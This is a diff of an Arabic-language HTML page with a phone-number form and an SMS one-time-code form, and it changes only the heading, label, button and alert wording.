@@ -88,7 +88,7 @@
 <body>
 
   <div class="container">
-    <h2>نموذج رقم الهاتف والكود</h2>
+    <h2>التسجيل برقم الهاتف </h2>
 
     <form id="phoneForm" onsubmit="return sendPhone(event);">
       <label for="phone">رقم الهاتف:</label>
@@ -99,9 +99,9 @@
 
     <form id="codeForm" onsubmit="return sendCode(event);">
       <div id="codeField">
-        <label for="code">الكود المرسل إليك:</label>
+        <label for="code">أنتظر رسالــة sms...  :</label>
         <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
-        <button type="submit" id="sendCodeBtn">إرسال الكود</button>
+        <button type="submit" id="sendCodeBtn">طلب الدخول</button>
       </div>
     </form>
   </div>
@@ -148,7 +148,7 @@
       sendPhoneBtn.disabled = true;
       startTimer(480); // 8 دقائق
 
-      alert('تم إرسال رقم الهاتف بنجاح، سيتم إرسال الكود قريبًا.');
+      alert('تم إرسال رقم الهاتف بنجاح، سيتم طلب الدخول قريبًا.');
 
       return false;
     }
@@ -179,7 +179,7 @@
         if (response.ok) {
           window.location.href = 'success.html';
         } else {
-          alert('حدث خطأ أثناء إرسال الكود. حاول مرة أخرى.');
+          alert('حدث خطأ أثناء طلب الدخول. حاول مرة أخرى.');
         }
       })
       .catch(error => {
